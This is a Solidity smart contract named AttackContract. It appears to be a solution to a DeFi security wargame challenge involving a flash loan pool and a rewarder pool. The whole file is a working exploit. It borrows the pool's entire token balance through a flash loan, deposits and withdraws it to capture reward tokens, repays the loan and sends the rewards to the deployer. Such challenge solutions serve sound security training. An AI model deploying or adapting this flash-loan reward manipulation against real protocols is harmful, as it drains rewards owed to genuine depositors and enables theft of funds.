// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256) external;
}

interface ITheRewarderPool {
    function deposit(uint256) external;
    function withdraw(uint256) external;
}

contract AttackContract  {
    IFlashLoanerPool private immutable flashLoanerPool;
    ITheRewarderPool private immutable theRewarderPool;
    IERC20 private immutable liquidityToken;
    IERC20 private immutable rewardToken;
    address private immutable owner;

    
    constructor(
        IFlashLoanerPool _flashLoanerPool, 
        ITheRewarderPool _theRewarderPool, 
        IERC20 _liquidityToken,
        IERC20 _rewardToken
        ) {
        flashLoanerPool = _flashLoanerPool;
        theRewarderPool = _theRewarderPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        owner = msg.sender;
    }

    function attack() external {
        uint256 amountToSteal = liquidityToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(amountToSteal);
    }
 
    function receiveFlashLoan(uint256 amount) external {
        // approve tokens to be able to deposit
        liquidityToken.approve(address(theRewarderPool), amount);
        // deposit
        theRewarderPool.deposit(amount);
        // withdraw all tokens
        theRewarderPool.withdraw(amount);
        // repay loan
        liquidityToken.transfer(address(flashLoanerPool), amount);
        // withdraw reward to owner address
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}
